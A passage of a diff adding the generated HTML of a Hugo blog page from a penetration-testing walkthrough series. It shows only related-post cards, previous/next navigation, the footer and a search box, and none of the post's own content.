+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Vulnerability
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/featured_hu_2e677f93ec549c8f.jpg);"></div>
+        
+      
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+          Part 3 Exploring Active Reconnaissance Techniques
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-04-09T10:32:25&#43;00:00">9 Apr, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1327 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/osint/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    OSINT
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/dns/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    DNS
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/featured_hu_f85410fc33fd5cc1.jpg);"></div>
+        
+      
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+          Part 2 Reconnaissance and Footprint
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-03-24T19:14:23&#43;00:00">24 Mar, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1163 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/osint/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    OSINT
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/anonymity/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Anonymity
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/featured_hu_c307d036cedb207a.png);"></div>
+        
+      
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+          Part 1 Building a Penetesting Lab
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-03-17T20:32:22&#43;00:00">17 Mar, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>709 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/lab/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Lab
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/pentesting/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pentesting
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+    </section>
+  
+
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts/Ultimate-Kali-Linux-Book/Part-5-Understanding-Reverse-and-Binding-Shell/index.md"
+          data-oid-likes="likes_posts/Ultimate-Kali-Linux-Book/Part-5-Understanding-Reverse-and-Binding-Shell/index.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Part 4 Performing Vulnerability Assessments</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-04-26T12:22:20&#43;00:00">26 Apr, 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/ultimate-kali-linux-book/part-6-all-on-networking-penetration-baby/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Part 6 All on Networking Penetration Baby</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-06-11T06:29:21&#43;00:00">11 Jun, 2024</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+        <ul class="flex flex-col list-none sm:flex-row">
+          
+            <li
+              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li
+              class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/categories/"
+                title="Categories">
+                
+                Categories
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          Valentin B
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
